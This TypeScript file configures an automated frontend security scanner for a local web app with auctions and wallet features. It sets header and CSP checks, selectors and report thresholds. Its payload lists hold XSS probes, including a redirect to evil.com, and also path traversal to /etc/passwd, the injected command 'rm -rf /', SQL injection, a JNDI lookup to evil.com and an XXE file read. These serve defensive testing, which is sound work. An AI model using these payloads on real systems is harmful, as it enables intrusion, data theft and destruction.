export interface FrontendSecurityConfig {
  // Testing URLs
  baseUrl: string;
  testUrls: string[];
  
  // Browser Configuration
  headless: boolean;
  timeout: number;
  viewport: {
    width: number;
    height: number;
  };
  
  // Test Configuration
  enableXSSTests: boolean;
  enableCSRFTests: boolean;
  enableWalletTests: boolean;
  enableInputValidation: boolean;
  enableSessionTests: boolean;
  enableCSPTests: boolean;
  enableHTTPSTests: boolean;
  enableStorageTests: boolean;
  enableAuthTests: boolean;
  enableClickjackingTests: boolean;
  enableTransactionTests: boolean;
  
  // XSS Test Payloads
  xssPayloads: string[];
  
  // Input Validation Payloads
  maliciousInputs: Array<{
    value: string;
    type: string;
    severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  }>;
  
  // Selectors
  selectors: {
    inputs: string[];
    forms: string[];
    buttons: string[];
    walletConnectors: string[];
    transactionForms: string[];
  };
  
  // Headers to Check
  securityHeaders: Array<{
    name: string;
    required: boolean;
    severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    recommendation: string;
  }>;
  
  // CSP Directives
  cspDirectives: Array<{
    name: string;
    required: boolean;
    unsafeValues: string[];
  }>;
  
  // Reporting
  generateReports: boolean;
  reportFormats: ('json' | 'html' | 'csv' | 'xml')[];
  reportPath: string;
  
  // Thresholds
  thresholds: {
    maxCritical: number;
    maxHigh: number;
    maxMedium: number;
    maxLow: number;
  };
}

export const defaultConfig: FrontendSecurityConfig = {
  // Testing URLs
  baseUrl: 'http://localhost:3000',
  testUrls: [
    '/',
    '/circles',
    '/auctions',
    '/portfolio',
    '/leaderboard'
  ],
  
  // Browser Configuration
  headless: true,
  timeout: 30000,
  viewport: {
    width: 1920,
    height: 1080
  },
  
  // Test Configuration
  enableXSSTests: true,
  enableCSRFTests: true,
  enableWalletTests: true,
  enableInputValidation: true,
  enableSessionTests: true,
  enableCSPTests: true,
  enableHTTPSTests: true,
  enableStorageTests: true,
  enableAuthTests: true,
  enableClickjackingTests: true,
  enableTransactionTests: true,
  
  // XSS Test Payloads
  xssPayloads: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(`XSS`)">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<div onclick=alert("XSS")>Click me</div>',
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '<script>document.location="http://evil.com"</script>',
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<form><button formaction="javascript:alert(1)">Submit</form>'
  ],
  
  // Input Validation Payloads
  maliciousInputs: [
    { value: '<script>alert("xss")</script>', type: 'XSS', severity: 'HIGH' },
    { value: '../../etc/passwd', type: 'Path Traversal', severity: 'MEDIUM' },
    { value: 'javascript:alert("xss")', type: 'JavaScript Protocol', severity: 'HIGH' },
    { value: 'A'.repeat(10000), type: 'Buffer Overflow', severity: 'MEDIUM' },
    { value: '${7*7}', type: 'Template Injection', severity: 'HIGH' },
    { value: '{{7*7}}', type: 'Template Injection', severity: 'HIGH' },
    { value: '<%= 7*7 %>', type: 'Template Injection', severity: 'HIGH' },
    { value: '"; rm -rf /; #', type: 'Command Injection', severity: 'CRITICAL' },
    { value: "' OR '1'='1", type: 'SQL Injection', severity: 'HIGH' },
    { value: '\x00\x01\x02\x03', type: 'Null Bytes', severity: 'MEDIUM' },
    { value: '../../../windows/system32/config/sam', type: 'Path Traversal (Windows)', severity: 'MEDIUM' },
    { value: '${jndi:ldap://evil.com/}', type: 'JNDI Injection', severity: 'CRITICAL' },
    { value: '<xml><!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]>&test;</xml>', type: 'XXE', severity: 'HIGH' }
  ],
  
  // Selectors
  selectors: {
    inputs: [
      'input[type="text"]',
      'input[type="email"]',
      'input[type="search"]',
      'input[type="url"]',
      'input[type="tel"]',
      'input[type="number"]',
      'textarea',
      'input[name]',
      '[contenteditable="true"]'
    ],
    forms: [
      'form',
      '[role="form"]',
      'form[data-transaction]',
      'form:has(input[name*="amount"])',
      'form:has(input[name*="bid"])'
    ],
    buttons: [
      'button[type="submit"]',
      'input[type="submit"]',
      'button[role="submit"]'
    ],
    walletConnectors: [
      'button[class*="wallet"]',
      'button[class*="connect"]',
      'button:has-text("Connect")',
      '[data-wallet]',
      '[class*="metamask"]',
      '[class*="wallet-connect"]'
    ],
    transactionForms: [
      'form[data-transaction]',
      'form:has(input[name*="amount"])',
      'form:has(input[name*="bid"])',
      'form:has(input[name*="value"])',
      '[data-transaction-form]'
    ]
  },
  
  // Headers to Check
  securityHeaders: [
    {
      name: 'strict-transport-security',
      required: true,
      severity: 'HIGH',
      recommendation: 'Implement HSTS with max-age of at least 31536000 seconds'
    },
    {
      name: 'content-security-policy',
      required: true,
      severity: 'HIGH',
      recommendation: 'Implement comprehensive Content Security Policy'
    },
    {
      name: 'x-content-type-options',
      required: true,
      severity: 'MEDIUM',
      recommendation: 'Set X-Content-Type-Options to nosniff'
    },
    {
      name: 'x-frame-options',
      required: true,
      severity: 'MEDIUM',
      recommendation: 'Set X-Frame-Options to DENY or SAMEORIGIN'
    },
    {
      name: 'x-xss-protection',
      required: false,
      severity: 'LOW',
      recommendation: 'Set X-XSS-Protection to 1; mode=block'
    },
    {
      name: 'referrer-policy',
      required: true,
      severity: 'LOW',
      recommendation: 'Set Referrer-Policy to strict-origin-when-cross-origin'
    },
    {
      name: 'permissions-policy',
      required: false,
      severity: 'LOW',
      recommendation: 'Set Permissions-Policy to restrict dangerous features'
    }
  ],
  
  // CSP Directives
  cspDirectives: [
    {
      name: 'default-src',
      required: true,
      unsafeValues: ["'unsafe-inline'", "'unsafe-eval'", '*']
    },
    {
      name: 'script-src',
      required: true,
      unsafeValues: ["'unsafe-inline'", "'unsafe-eval'", '*']
    },
    {
      name: 'style-src',
      required: true,
      unsafeValues: ["'unsafe-inline'", '*']
    },
    {
      name: 'img-src',
      required: true,
      unsafeValues: ['*']
    },
    {
      name: 'connect-src',
      required: true,
      unsafeValues: ['*']
    },
    {
      name: 'frame-ancestors',
      required: true,
      unsafeValues: ['*']
    },
    {
      name: 'object-src',
      required: false,
      unsafeValues: ['*']
    },
    {
      name: 'base-uri',
      required: false,
      unsafeValues: ['*']
    }
  ],
  
  // Reporting
  generateReports: true,
  reportFormats: ['json', 'html'],
  reportPath: './security/reports',
  
  // Thresholds
  thresholds: {
    maxCritical: 0,
    maxHigh: 0,
    maxMedium: 5,
    maxLow: 10
  }
};

export class ConfigValidator {
  static validate(config: Partial<FrontendSecurityConfig>): FrontendSecurityConfig {
    const mergedConfig = { ...defaultConfig, ...config };
    
    // Validate URLs
    if (!mergedConfig.baseUrl) {
      throw new Error('baseUrl is required');
    }
    
    try {
      new URL(mergedConfig.baseUrl);
    } catch {
      throw new Error('baseUrl must be a valid URL');
    }
    
    // Validate timeout
    if (mergedConfig.timeout <= 0) {
      throw new Error('timeout must be positive');
    }
    
    // Validate thresholds
    if (mergedConfig.thresholds.maxCritical < 0 ||
        mergedConfig.thresholds.maxHigh < 0 ||
        mergedConfig.thresholds.maxMedium < 0 ||
        mergedConfig.thresholds.maxLow < 0) {
      throw new Error('thresholds must be non-negative');
    }
    
    // Validate report formats
    const validFormats = ['json', 'html', 'csv', 'xml'];
    for (const format of mergedConfig.reportFormats) {
      if (!validFormats.includes(format)) {
        throw new Error(`Invalid report format: ${format}`);
      }
    }
    
    return mergedConfig;
  }
}

export default defaultConfig;
